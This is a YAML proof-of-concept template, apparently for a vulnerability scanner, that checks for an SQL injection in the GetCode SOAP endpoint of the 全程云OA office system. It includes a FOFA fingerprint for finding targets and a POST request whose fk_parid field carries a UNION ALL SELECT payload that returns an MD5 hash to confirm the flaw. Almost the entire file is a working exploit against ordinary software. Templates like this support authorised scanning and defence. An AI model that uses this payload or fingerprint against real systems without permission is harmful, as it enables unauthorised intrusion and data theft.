id: poc-yaml-quan-cheng-yun-getcode-sqli
info:
  name: 全程云OA GetCode SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 全程云OA
  fofa: body="images/yipeoplehover.png"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /OA/PES/QCPES.asmx
  headers:
    SOAPAction: http://tempuri.org/GetCode
    Content-Type: text/xml; charset=utf-8
  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n  <soap:Body>\n    <GetCode xmlns=\"http://tempuri.org/\">\n      <fk_parid>1'\
    \ UNION ALL SELECT sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))-- oCWH</fk_parid>\n\
    \      <value>1</value>\n    </GetCode>\n  </soap:Body>\n</soap:Envelope>"
  expression: status_code == 200 && contains(body,"<GetCodeResult>") && contains(body,"0x"
    + t2) && contains(content_type,"text/xml")
transport: http
